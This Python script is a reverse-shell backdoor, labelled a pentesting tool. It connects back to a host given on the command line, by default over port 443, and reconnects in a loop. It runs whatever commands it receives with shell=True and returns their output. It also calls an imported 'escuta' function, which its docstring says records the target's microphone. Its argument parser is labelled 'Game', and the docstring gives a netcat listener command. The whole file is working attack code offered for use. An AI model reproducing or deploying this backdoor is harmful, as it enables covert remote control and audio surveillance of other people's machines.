#!/usr/bin/env python
# -*- coding: utf-8 -*- 

"""
Tool made only for pentesting.

Small and nasty.

IN SOON >>   Update: It now has a function that allows recording audio from the target
machine's microphone.



# put netcat in mode listener, to test
# nc -l -v -p <port_to_connect>
"""

import signal
import subprocess
from socket import *
import sys
import os
import subprocess
import argparse 

from escuta import escuta

s = None
connected = False

class Alarm(Exception):
    """Used to make sure a subprocess lasts 30 seconds max"""
    pass


def alarm_handler(signum, frame):
    raise Alarm


def main(host, port):
    global s
    global connected
    while True:
        connected = False
        while True:
            while not connected:
                try:
                    s = socket(AF_INET, SOCK_STREAM)
                    s.connect((host, port))
                    connected = True
                except:
                    # try again
                    pass

            try:
                msg = s.recv(20480)
                allofem = msg.split(";")
                for onebyone in allofem:
                    commands = onebyone.split()
                    if commands[0] == "cd":
                        if len(commands) > 1:
                            os.chdir(commands[1])
                        s.send(os.getcwd())
                    elif commands[0] == "escuta":
                         escuta()
                    elif commands[0] == "pwd":
                        s.send(os.getcwd())             
                    elif commands[0] == "opencd":
                        os.system("eject")
                    elif commands[0] == "quit":
                        s.close()
                        break
                    else:
                        thecommand = ' '.join(commands)
                        comm = subprocess.Popen(thecommand, shell=True,
                                                stdout=subprocess.PIPE,
                                                stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE)
                        signal.signal(signal.SIGALRM, alarm_handler)
                        signal.alarm(30)
                        try:
                            STDOUT, STDERR = comm.communicate()
                            en_STDERR = bytearray(STDERR)
                            en_STDOUT = bytearray(STDOUT)
                            if en_STDERR == "":
                                if en_STDOUT != "":
                                 
                                    s.send(en_STDOUT)
                                else:
                                    s.send(en_STDOUT)
                                    pass
                            else:
                                
                                s.send(en_STDERR)
                        except Alarm:
                            comm.terminate()
                            comm.kill()
                            s.send("\n")
                        signal.alarm(100)
            except:
                s.close()
                break

if __name__ == "__main__":
    carg = argparse.ArgumentParser(description='Game',
                                   epilog='Use me')

    carg.add_argument('-d', '--host', type=str, help='Host to made connection', required=True, default='127.0.0.0.1')
    carg.add_argument('-p', '--port', type=int, help='Port to connect',default=443)
    args = carg.parse_args()

    host = args.host
    port = args.port

    if len(sys.argv) == True:
        host_server = host
        port_server = port
    while True:
        try:
            main(host, port)
            escuta()
    #        time()
        except KeyboardInterrupt:
            # Close connection, if exists
            if connected:
                s.close
